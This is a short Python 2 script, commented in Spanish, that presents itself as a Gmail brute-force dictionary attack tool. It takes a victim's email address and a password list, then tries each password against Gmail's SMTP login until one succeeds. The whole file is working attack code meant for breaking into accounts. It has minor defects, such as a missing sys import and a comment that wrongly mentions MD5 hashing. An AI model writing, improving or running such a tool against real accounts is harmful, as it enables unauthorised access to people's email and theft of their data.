import smtplib

def banner():
	print '''
	|-----------------------------------------------|
	|[+] GMAIL Brute Force Dictorionary Attack      |
	|[+] Written by: Iker Burguera                  |
	|[+] Version: 1.0                               |
	|[+] Email me @: ikerburguera@gmail.com         |
	|-----------------------------------------------|
	'''
	print "\nUso:"
	print "-"*90
	print "%s \t--email [gmail address]\t --pwdlist [password list]" % sys.argv[0]
	print "-"*90

def uso():
  if len(sys.argv) <4 or sys.argv[1]!='--email' or sys.argv[3]!='--pwdlist':
    banner()
    sys.exit(1)

uso()

commandEmail  = sys.argv[1]                       # Recogemos el correo de la victima con el comando '--email' de la consola
commandDict   = sys.argv[3]                       # Recogemos el Path con el listado de Password con el comando '--pwdlist' de la consola

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)  # Creamos la variable smtpserver para manejar las peticiones al servidor
smtpserver.ehlo()                                 # Enviamos un ehlo() para avisar que vamos a empezar una comunicacion con el servidor smtp
smtpserver.starttls()                             # Empezamos la comunicacion a través de un canal seguro TLS

banner()

if commandEmail == '--email' and commandDict == '--pwdlist' :      # Comprobamos que han introducido bien los comandos
	emailToHack         = sys.argv[2]
	dictionaryPath   	= sys.argv[4]

	try:
		pwfile = open(dictionaryPath,"r")
	except:
		print "\nFichero no encontrado."
		print "CommandEmail: %s " % sys.argv[1]
		print "CommandDict : %s " % sys.argv[3]
		quit()

	for password in pwfile:                           # Recorremos todo el fichero de palabras para obtener el password e intentar acceder al correo con esas credenciales
		try:
			smtpserver.login(emailToHack,password)				# Cogemos solamente la palabra del fichero y la convertimos en Hash MD5
			print "-"*120
			print "[+] Password found : %s " % password
			print "-"*120
			break
		except smtplib.SMTPAuthenticationError:
			print "[!] Password Incorrect: %s " % password
	
else:																                # Si los comandos no son correctos les mostramos como se usa-> uso()
	uso()
